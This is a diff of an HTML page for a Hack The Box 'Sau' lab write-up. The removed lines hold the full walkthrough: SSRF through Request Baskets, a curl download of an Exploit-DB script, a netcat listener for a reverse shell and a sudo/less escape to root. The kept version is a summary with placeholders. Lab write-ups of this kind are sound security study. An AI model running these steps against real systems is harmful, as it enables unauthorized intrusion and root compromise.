@@ -9,116 +9,84 @@
   <link rel="stylesheet" href="../css/style.css" />
   <link rel="stylesheet" href="../css/skins/color-red.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
+
+  <style>
+    body.dark p,
+    body.dark li {
+      color: var(--text-black-700);
+    }
+
+    code,
+    pre {
+      background-color: #1e1e1e;
+      color: #f8f8f2;
+      padding: 10px;
+      border-radius: 5px;
+      display: block;
+      overflow-x: auto;
+      margin-bottom: 15px;
+    }
+
+    ul {
+      padding-left: 1.5em;
+    }
+
+    img {
+      max-width: 100%;
+      border: 2px solid #444;
+      border-radius: 8px;
+      margin: 20px 0;
+    }
+  </style>
 </head>
 <body class="dark">
-  <!-- Matrix Background -->
-  <canvas id="matrixCanvas"></canvas>
-  <script src="../js/matrix.js"></script>
 
-  <!-- Sidebar / Nav -->
-  <div class="aside">
-    <div class="logo">
-      <a href="../index.html"><span>L1chS3c</span></a>
-      <div class="profile-pic">
-        <img src="../images/profile.jpg" alt="Profile Picture">
-      </div>
+<!-- Matrix Background -->
+<canvas id="matrixCanvas"></canvas>
+<script src="../js/matrix.js"></script>
+
+<!-- Sidebar / Nav -->
+<div class="aside">
+  <div class="logo">
+    <a href="../index.html"><span>L1chS3c</span></a>
+    <div class="profile-pic">
+      <img src="../images/profile.jpg" alt="Profile Picture">
     </div>
-    <ul class="nav">
-      <li><a href="../index.html#home"><i class="fa fa-home"></i> Home</a></li>
-      <li><a href="../index.html#about"><i class="fa fa-user"></i> About</a></li>
-      <li><a href="../index.html#education"><i class="fa fa-book"></i> Education</a></li>
-      <li><a href="../index.html#contact"><i class="fa fa-comments"></i> Contact</a></li>
-      <li><a href="writeuphome.html" class="active"><i class="fa fa-terminal"></i> Writeups</a></li>
-    </ul>
   </div>
+  <ul class="nav">
+    <li><a href="../index.html#home"><i class="fa fa-home"></i> Home</a></li>
+    <li><a href="../index.html#about"><i class="fa fa-user"></i> About</a></li>
+    <li><a href="../index.html#education"><i class="fa fa-book"></i> Education</a></li>
+    <li><a href="../index.html#contact"><i class="fa fa-comments"></i> Contact</a></li>
+    <li><a href="writeuphome.html" class="active"><i class="fa fa-terminal"></i> Writeups</a></li>
+  </ul>
+</div>
 
-  <!-- Main Content -->
-  <section class="section" style="padding-left: 15px;">
-    <div class="container">
-      <div class="section-title">
-        <h2>HTB: Sau</h2>
-      </div>
-
-      <p style="color: var(--text-black-700); font-size: 18px; margin-bottom: 30px;">
-        Difficulty: Easy • OS: Linux • Tags: SSRF, RCE, Sudo Misconfig, Enumeration
-      </p>
-
-      <h3 style="color: var(--skin-color);">Overview</h3>
-      <p>
-        <strong>Sau</strong> is an Easy-rated Linux box that showcases one of my favorite types of vulnerabilities: <strong>Server-Side Request Forgery (SSRF)</strong>. The initial entry point involved exploiting a misconfigured instance of Request Baskets using <code>CVE-2023-27163</code>, which allowed forwarding HTTP requests to internal services not exposed to the public network. This led to the discovery of a Maltrail instance vulnerable to <strong>unauthenticated OS command injection</strong> (<code>CVE-2023-27561</code>), resulting in remote code execution as a low-privileged user. Privilege escalation was then achieved through a <strong>sudo misconfiguration</strong>, allowing execution of a systemctl command as root without a password.
-      </p>
-
-      <h3 style="color: var(--skin-color); margin-top: 30px;">🔍 Initial Enumeration</h3>
-      <pre><code>nmap -p- -sC -sV -T4 10.129.229.26</code></pre>
-      <p>Nmap revealed:</p>
-      <pre><code>
-22/tcp   open     ssh
-80/tcp   filtered http
-8338/tcp filtered unknown
-55555/tcp open    unknown
-      </code></pre>
-      <p>Port 55555 was the only one responding — browsing to it revealed the vulnerable Request Baskets web interface.</p>
-      <img src="images/sau-rb-interface.png" alt="Request Baskets Screenshot" />
-
-      <h3 style="color: var(--skin-color);">🚪 Request Baskets — SSRF (CVE-2023-27163)</h3>
-      <p>
-        We created a new basket via curl:
-      </p>
-      <pre><code>
-curl -X POST http://10.129.229.26:55555/api/baskets/hackbox -H "Content-Type: application/json" -d '{}'
-      </code></pre>
-      <p>The server responded with a token used to modify and access the basket configuration.</p>
-      <img src="images/sau-curl-token.png" alt="Curl Token Screenshot" />
-
-      <h3 style="color: var(--skin-color);">🧪 Verifying SSRF</h3>
-      <p>Set up a listener:</p>
-      <pre><code>python3 -m http.server 8000</code></pre>
-      <p>Then reconfigure the basket using Burp:</p>
-      <img src="images/sau-put-request.png" alt="Burp PUT request" />
-      <p>Triggering SSRF:</p>
-      <pre><code>curl http://10.129.229.26:55555/hackbox</code></pre>
-      <img src="images/sau-ssrf-hit.png" alt="SSRF Directory Listing Screenshot" />
-      <p>✅ SSRF confirmed. We now know the vulnerable server will relay our requests internally.</p>
-
-      <h3 style="color: var(--skin-color);">🧱 SSRF to Internal Port 80 – Maltrail Discovery</h3>
-      <p>We changed the <code>forward_url</code> to <code>http://127.0.0.1:80</code> and visited the basket again. This revealed a running Maltrail instance not accessible externally.</p>
-      <img src="images/sau-maltrail-detected.png" alt="Maltrail SSRF Screenshot" />
-
-      <h3 style="color: var(--skin-color);">💥 Remote Code Execution – CVE-2023-27561</h3>
-      <p>We exploited unauthenticated RCE via Maltrail:</p>
-      <pre><code>
-curl -s https://www.exploit-db.com/download/51676 -o exploit.py
-nc -lvnp 4444
-python3 exploit.py 10.10.14.207 4444 http://10.129.229.26:55555/hackbox
-      </code></pre>
-      <p>✅ Shell popped as <code>puma</code>.</p>
-      <img src="images/sau-shell-as-puma.png" alt="Shell Screenshot" />
-
-      <h3 style="color: var(--skin-color);">🔺 Privilege Escalation – CVE-2023-26604</h3>
-      <p>Checked sudo permissions:</p>
-      <pre><code>sudo -l</code></pre>
-      <p>Output:</p>
-      <pre><code>(ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>
-      <p>Exploited the insecure <code>less</code> environment via:</p>
-      <pre><code>
-sudo /usr/bin/systemctl status trail.service
-!/bin/bash
-      </code></pre>
-      <p>✅ Root shell obtained.</p>
-      <img src="images/sau-root-confirmed.png" alt="Root Shell Screenshot" />
-
-      <h3 style="color: var(--skin-color);">💡 Takeaways</h3>
-      <ul>
-        <li>SSRF is extremely powerful when it leads to internal enumeration</li>
-        <li>RCE without authentication is a goldmine</li>
-        <li>Sudo misconfigs like <code>less</code> are still very relevant</li>
-        <li>Request Baskets is great for SSRF practice</li>
-      </ul>
-
-      <a href="writeuphome.html" class="btn">← Back to Writeups</a>
+<!-- Main Writeup Content -->
+<section class="section" style="padding-left: 15px;">
+  <div class="container">
+    <div class="section-title">
+      <h2>HTB: Sau</h2>
     </div>
-  </section>
 
-  <script src="../js/script.js"></script>
+    <p style="font-size: 18px; margin-bottom: 30px;">
+      Difficulty: Easy • OS: Linux • Tags: SSRF, RCE, Sudo Misconfig, Enumeration
+    </p>
+
+    <!-- Paste your writeup content here -->
+    <!-- Example: -->
+    <h3 style="color: var(--skin-color); margin-top: 20px;">Overview</h3>
+    <p>
+      <strong>Sau</strong> is an Easy-rated Linux box that showcases one of my favorite types of vulnerabilities: <strong>Server-Side Request Forgery (SSRF)</strong>. The initial entry point involved exploiting a misconfigured instance of Request Baskets using <code>CVE-2023-27163</code>, which allowed forwarding HTTP requests to internal services not exposed to the public network. This led to the discovery of a Maltrail instance vulnerable to <strong>unauthenticated OS command injection</strong> (<code>CVE-2023-27561</code>), resulting in remote code execution as a low-privileged user. Privilege escalation was then achieved through a <strong>sudo misconfiguration</strong>, allowing execution of a systemctl command as root without a password.
+    </p>
+
+    <!-- Add your other sections (Enumeration, Exploitation, Privesc, etc.) below -->
+
+    <a href="writeuphome.html" class="btn">← Back to Writeups</a>
+  </div>
+</section>
+
+<!-- Optional: Script for toggling sidebar on mobile -->
+<script src="../js/script.js"></script>
 </body>
 </html>
